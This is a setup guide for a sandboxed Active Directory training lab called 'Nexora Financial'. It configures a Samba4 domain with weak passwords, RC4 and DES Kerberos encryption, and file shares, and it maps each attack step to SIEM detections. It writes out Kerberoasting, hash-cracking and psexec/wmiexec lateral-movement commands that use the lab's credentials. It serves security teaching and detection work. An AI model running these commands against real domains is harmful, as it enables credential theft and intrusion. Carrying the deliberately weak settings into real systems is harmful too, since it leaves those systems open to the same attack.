# SC-02 Nexora Financial — Samba4 Active Directory Configuration Guide

**Date**: 2026-04-15  
**Scenario**: Nexora Financial Services — Active Directory Compromise  
**Focus**: AD Enumeration, Kerberoasting, Lateral Movement, DCSync

---

## Architecture Overview

### Network Topology
```
┌─────────────────────────────────────────────┐
│           172.20.2.0/24 (sc02-net)          │
├─────────────────────────────────────────────┤
│                                             │
│  ┌──────────────────┐  ┌────────────────┐  │
│  │  sc02-dc         │  │  sc02-fileserver│  │
│  │  172.20.2.20     │  │  172.20.2.40    │  │
│  │  (Samba4 AD DC)  │  │  (Member Server)│  │
│  │                  │  │                 │  │
│  │  KDC: 88         │  │  SMB: 445/139   │  │
│  │  LDAP: 389       │  │  Shares:        │  │
│  │  DNS: 53         │  │  - Public       │  │
│  │                  │  │  - Finance      │  │
│  │  Users:          │  │  - Backups      │  │
│  │  - Administrator │  │  - Admin        │  │
│  │  - jsmith        │  │                 │  │
│  │  - svc_backup*   │  │  *Target user   │  │
│  │  - it.admin      │  │   for Kerb      │  │
│  │                  │  │                 │  │
│  └──────────────────┘  └────────────────┘  │
│         ▲                      │             │
│         └──────────────────────┘             │
│              Domain Join                    │
└─────────────────────────────────────────────┘

* svc_backup has SPN: CIFS/NEXORA-FS01.nexora.local
* RC4 encryption enabled (intentional for Kerberoasting demo)
```

### Domain Configuration
| Property | Value |
|----------|-------|
| Domain FQDN | nexora.local |
| Realm | NEXORA.LOCAL |
| NetBIOS | NEXORA |
| Admin Password | NexoraAdmin2024! |
| DC Hostname | NEXORA-DC |
| File Server | NEXORA-FS01 |

---

## Users & Accounts

### Account Inventory
```
1. Administrator
   - Password: NexoraAdmin2024!
   - Groups: Domain Admins
   - Role: Domain Controller admin
   - SPN: N/A
   - Attack Vector: N/A (protected)

2. jsmith
   - Password: Welcome1!
   - Groups: Domain Users
   - Role: Regular user (finance)
   - SPN: N/A
   - Attack Vector: Lateral movement target (low-privilege)

3. svc_backup ← PRIMARY KERBEROASTING TARGET
   - Password: Backup2023
   - Groups: Domain Users
   - Role: Service account (backup operations)
   - SPN: CIFS/NEXORA-FS01.nexora.local
   - Attack Vector: Kerberoasting (RC4 hash extraction)
   - Feature: Password never expires (for lab reliability)

4. it.admin
   - Password: Welcome1!
   - Groups: Domain Admins
   - Role: IT administrator
   - SPN: N/A
   - Attack Vector: Lateral movement target (high-privilege)
```

### Password Policy
- No complexity requirements (intentional for testing)
- No expiration (set via `samba-tool user setexpiry --noexpiry`)
- All passwords in cleartext in this guide (sandboxed environment)

---

## Attack Paths & SIEM Detection

### Path 1: User Enumeration → Kerberoasting

**Attacker Commands:**
```bash
# Step 1: Enumerate users and SPNs
enum4linux 172.20.2.20                    # Enumerate users, shares
enum4linux -a 172.20.2.20                 # All info dump
ldapsearch -h 172.20.2.20 -x -b "dc=nexora,dc=local" svc_backup

# Step 2: Kerberoast svc_backup
GetUserSPNs.py nexora.local/jsmith:Welcome1@ -target-ip 172.20.2.20
GetUserSPNs.py nexora.local/jsmith@NEXORA.LOCAL -target-ip 172.20.2.20

# Step 3: Request TGS for svc_backup
impacket's GetUserSPNs.py will request TGS and output it
# Output: TGS-REQ for CIFS/NEXORA-FS01.nexora.local with RC4-HMAC

# Step 4: Crack the RC4 hash offline (Hashcat)
hashcat -m 13100 hash.txt rockyou.txt --force
```

**SIEM Events Triggered:**
1. ✓ `sc02_enum_ldap_query` → LDAP queries for user enumeration
2. ✓ `sc02_bloodhound_spn_query` → SPN enumeration activity
3. ✓ `sc02_kerberos_roasting` → TGS request (RC4 encryption) — **CRITICAL**
4. ✓ `sc02_kerberos_tgt_request` → TGT obtained

---

### Path 2: Lateral Movement via Compromised Credential

**Attacker Actions:**
```bash
# After cracking svc_backup password → Backup2023

# Attempt psexec to file server
impacket/psexec.py nexora.local/svc_backup:Backup2023@172.20.2.40
# OR
impacket/wmiexec.py nexora.local/svc_backup:Backup2023@172.20.2.40
```

**SIEM Events:**
1. ✓ `sc02_lateral_psexec` → Admin share access (Event 5145)
2. ✓ `sc02_auth_successful_logon` → Successful logon with compromised account

---

### Path 3: Access to Finance/Backup Shares

**File Server Shares:**
```
Public
  ├── employee-handbook.pdf
  ├── welcome.txt
  └─ Access: Everyone (no auth)

Finance (restricted)
  ├── budget-2024.xlsx
  ├── salary-grid-2024.xlsx
  └─ Access: Domain Users, jsmith (contains sensitive data)

Backups (highly restricted)
  ├── db_backup_20240115.bak
  └─ Access: Domain Admins, svc_backup (production data)

Admin (read-only, hidden)
  ├── audit_log.txt
  └─ Access: it.admin, Domain Admins (administrative logs)
```

**Student Red Team Objectives:**
1. Enumerate domain → find svc_backup with SPN
2. Kerberoast svc_backup → capture TGS
3. Crack TGS hash offline (RC4 = fast to crack)
4. Use credentials to access sensitive shares
5. Optionally: DCSync as Domain Admin to extract krbtgt hash

---

## Kerberos & Encryption Configuration

### Why RC4 is Enabled (Educational Purpose)
```
Kerberos Encryption Types (by preference):
1. AES-256-CTS (strong, modern)
2. RC4-HMAC (weak, fast to crack — intentional for lab)
3. DES-CBC-MD5 (very weak, for compatibility)

Why this matters:
- AES requires brute-forcing ticket service to extract TGS
- RC4 can be extracted via `GetUserSPNs.py` and cracked
  in seconds with offline dictionary attack
- DES is obsolete but included for completeness

Student learns:
- Weak crypto = exploitable (Kerberoasting)
- Importance of enforcement of AES-only
- Time/effort difference between weak/strong encryption
```

### Kerberos Configuration (provision-dc.sh)
```ini
[libdefaults]
    default_realm = NEXORA.LOCAL
    # Allow RC4 for Kerberoasting demonstration
    default_tkt_enctypes = aes256-cts rc4-hmac des-cbc-md5
    default_tgs_enctypes = aes256-cts rc4-hmac des-cbc-md5
    preferred_enctypes = aes256-cts rc4-hmac des-cbc-md5
    allow_weak_crypto = true

[realms]
    NEXORA.LOCAL = {
        kdc = 127.0.0.1:88
        admin_server = 127.0.0.1:749
        master_kdc = 127.0.0.1:88
        tkt_enctypes = aes256-cts rc4-hmac des-cbc-md5
        tgs_enctypes = aes256-cts rc4-hmac des-cbc-md5
    }
```

---

## SIEM Event Mapping

### Events Triggered by Reconnaissance

| Command | Event ID | Severity | Detection |
|---------|----------|----------|-----------|
| `enum4linux 172.20.2.20` | `sc02_enum_enum4linux` | MED | SMB access patterns |
| `ldapsearch ...` | `sc02_enum_ldap_query` | MED | LDAP queries on port 389 |
| `GetUserSPNs.py` | `sc02_bloodhound_spn_query` | HIGH | SPN enumeration activity |
| `nmap 172.20.2.20` | `sc02_recon_nmap_syn` | LOW | Network scan traffic |

### Events Triggered by Kerberoasting

| Step | Command | Event | Raw Log Format |
|------|---------|-------|-----------------|
| 1 | TGT Request | `sc02_kerberos_tgt_request` | Kerberos AS-REQ (Authentication Service) |
| 2 | TGS Request (RC4) | `sc02_kerberos_roasting` | **Kerberos TGS response with RC4-HMAC** |
| 3 | Crack Hash | Manual offline (no SIEM) | Dictionary attack against RC4 ticket |
| 4 | Use Credential | `sc02_auth_successful_logon` | Logon event with compromised account |

### Events Triggered by Lateral Movement

| Attack | Event | Raw Log |
|--------|-------|---------|
| psexec | `sc02_lateral_psexec` | Event 5140 (Network share access, admin$) |
| wmiexec | `sc02_lateral_wmi` | Event 4688 (Process creation) |
| pass-the-hash | `sc02_lateral_pass_hash` | Event 4624 (Logon type 3 + hash evidence) |

---

## Configuration Details

### Samba4 DC Configuration (provision-dc.sh)

**Domain Provisioning:**
```bash
samba-tool domain provision \
    --use-rfc2307 \
    --realm=NEXORA.LOCAL \
    --domain=NEXORA \
    --server-role=dc \
    --dns-backend=SAMBA_INTERNAL \
    --adminpass="NexoraAdmin2024!"
```

**User Creation:**
```bash
samba-tool user create jsmith "Welcome1!"
samba-tool user create svc_backup "Backup2023"
samba-tool user create it.admin "Welcome1!"

# Add svc_backup SPN (enables Kerberoasting)
samba-tool user addspn svc_backup "CIFS/NEXORA-FS01.nexora.local"

# Set passwords to never expire
samba-tool user setexpiry svc_backup --noexpiry
```

### File Server Configuration (setup-shares.sh)

**Domain Join:**
```bash
net ads join -U administrator%NexoraAdmin2024!
```

**Shares Configuration (smb.conf):**
```ini
[Public]
    path = /srv/shares/public
    guest ok = yes
    writable = yes

[Finance]
    path = /srv/shares/finance
    valid users = @"NEXORA\Domain Users", NEXORA\jsmith
    writable = yes

[Backups]
    path = /srv/shares/backups
    valid users = @"NEXORA\Domain Admins", NEXORA\svc_backup
    browseable = no

[Admin]
    path = /srv/shares/admin
    valid users = NEXORA\it.admin, @"NEXORA\Domain Admins"
    read only = yes
    browseable = no
```

### Audit Logging (smb.conf)

```ini
vfs objects = full_audit
full_audit:priority = notice
full_audit:facility = LOCAL1
full_audit:success = open opendir read write create mkdir rmdir unlink rename
full_audit:failure = open read write
full_audit:prefix = %u|%I|%m|%S
```

Logs written to `/var/log/samba/log.%m` for SIEM parsing.

---

## Testing Verification Checklist

### ✓ Build & Startup
- [ ] `docker-compose --profile sc02 build` succeeds
- [ ] `docker-compose --profile sc02 up -d` brings up sc02-dc and sc02-fileserver
- [ ] sc02-dc container health check passes (smbclient works)
- [ ] sc02-fileserver health check passes (smbclient works)
- [ ] Both containers reach healthy state within 60 seconds

### ✓ Domain Controller
- [ ] `smbclient -L 172.20.2.20 -N` lists shares
- [ ] LDAP responds on port 389: `ldapsearch -h 172.20.2.20 -x`
- [ ] Kerberos responds on port 88: `kinit jsmith@NEXORA.LOCAL`
- [ ] DNS resolves domain: `nslookup nexora.local 172.20.2.20`

### ✓ User Configuration
- [ ] `samba-tool user list` shows 4 users (admin, jsmith, svc_backup, it.admin)
- [ ] svc_backup has SPN: `samba-tool user show svc_backup | grep SPN`
- [ ] Users can authenticate: `kinit jsmith@NEXORA.LOCAL` + password
- [ ] Kerberos tickets are RC4: Check TGS encryption type in ticket

### ✓ File Server
- [ ] Domain join successful: `net ads info` shows domain
- [ ] Shares accessible: `smbclient //172.20.2.40/Public -N`
- [ ] Finance share restricted: `smbclient //172.20.2.40/Finance -N` (denied)
- [ ] Finance share with auth: `smbclient //172.20.2.40/Finance -U jsmith%Welcome1!` (success)
- [ ] Backup share accessible to svc_backup: `smbclient //172.20.2.40/Backups -U NEXORA/svc_backup%Backup2023`
- [ ] Admin share read-only for it.admin: Files present, write denied

### ✓ Kerberoasting Simulation
From Kali container:
```bash
# Enumerate domain
enum4linux 172.20.2.20              # Should show svc_backup user
enum4linux -a 172.20.2.20           # Full dump

# Kerberoast (requires impacket tools)
GetUserSPNs.py nexora.local/jsmith:Welcome1@ \
  -request -outputfile hashes.txt

# Verify TGS is RC4
grep "RC4" hashes.txt                # Should find RC4-HMAC hash

# Attempt to crack (should succeed in <5 minutes with rockyou.txt)
hashcat -m 13100 hashes.txt rockyou.txt --force
# Expected: Backup2023 (cracked)
```

### ✓ SIEM Event Detection
Commands that should trigger events:
```bash
nmap 172.20.2.20                    # → recon event
enum4linux 172.20.2.20              # → enum event
ldapsearch -h 172.20.2.20 -x        # → ldap event
GetUserSPNs.py ...                  # → bloodhound_spn_query (CRITICAL)
smbclient //172.20.2.40/ -U nesora/svc_backup%Backup2023
```

Verify SIEM feed shows corresponding events with correct severity levels.

---

## Known Limitations & Workarounds

### 1. Samba Audit Logging vs Windows Event IDs
**Issue**: Samba doesn't generate Windows Event IDs (4625, 4769, etc.)  
**Workaround**: Use full_audit VFS module + custom SIEM rules  
**Impact**: Events are functional but format differs from real AD

### 2. Kerberos RC4-Only for Attacks
**Issue**: Some impacket tools require AES support  
**Workaround**: Tools automatically fall back to RC4 when AES unavailable  
**Impact**: Minor - most tools work fine with RC4

### 3. Domain Join Timing
**Issue**: File server may try to join before DC is fully ready  
**Workaround**: setup-shares.sh has retry logic (up to 60s wait)  
**Impact**: Occasional 10-20s startup delay on first boot

---

## Troubleshooting

### DC won't start
```bash
docker logs sc02-dc
# Check for:
# - Missing packages
# - Port conflicts (88, 389, 445)
# - Insufficient disk space (/var/lib/samba/private)
```

### File server won't join domain
```bash
docker logs sc02-fileserver
# Check for:
# - DC unreachable (use docker exec sc02-fileserver nc -zv 172.20.2.20 389)
# - Wrong admin password
# - DNS not resolving nexora.local
```

### Kerberoasting not working
```bash
# Verify SPN is set
docker exec sc02-dc samba-tool user show svc_backup | grep SPN

# Verify RC4 is enabled in krb5.conf
docker exec sc02-dc grep -A 3 "default_tgs_enctypes" /etc/krb5.conf
```

---

## Educational Objectives Achieved

By configuring SC-02 this way, students learn:

1. **Active Directory Structure**
   - Domain architecture (DC, member servers)
   - User accounts and groups
   - Service accounts and SPNs

2. **Kerberos Protocol**
   - TGT (Ticket Granting Ticket) requests
   - TGS (Ticket Granting Service) requests
   - Encryption type negotiation

3. **Kerberoasting Attack**
   - Why SPNs are vulnerable
   - How to enumerate SPNs
   - How to extract and crack TGS tickets
   - Impact of weak encryption (RC4 vs AES)

4. **Lateral Movement**
   - Using compromised credentials for access
   - Share permissions and access control
   - Detection via SIEM logs

5. **Defense**
   - Enforcing AES-only encryption
   - Monitoring SPN requests
   - Detecting unusual logon patterns
   - SIEM correlation for attack chains
